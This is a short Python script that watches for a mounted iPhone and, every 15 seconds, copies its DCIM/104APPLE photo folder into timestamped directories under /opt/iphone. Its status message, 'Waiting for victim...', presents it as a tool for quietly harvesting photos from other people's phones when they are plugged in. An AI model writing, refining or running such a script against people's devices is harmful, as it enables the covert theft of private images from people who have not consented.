import os
import shutil
from datetime import datetime
import time

# Define the source path and base destination path
src_path = "/mnt/iphone/DCIM/104APPLE"
base_dst_path = "/opt/iphone"

def copytree(src, dst):
    if not os.path.exists(dst):
        os.makedirs(dst)
    for item in os.listdir(src):
        s = os.path.join(src, item)
        d = os.path.join(dst, item)
        if os.path.isdir(s):
            copytree(s, d)
        else:
            shutil.copy2(s, d)

while True:  # Keep running the script
    # Check if iPhone is mounted and DCIM/104APPLE folder exists
    if os.path.exists(src_path):
        # Create a new uniquely named directory in the base destination path
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        dst_path = os.path.join(base_dst_path, timestamp)
        os.makedirs(dst_path, exist_ok=True)

        # Copy the 104APPLE folder
        copytree(src_path, os.path.join(dst_path, "104APPLE"))

        print(f"Successfully copied images to {dst_path}")
    else:
        print("No iPhone found or DCIM directory does not exist. Waiting for victim...")

    # Wait for a while before checking again
    time.sleep(15)  # wait for 15 seconds
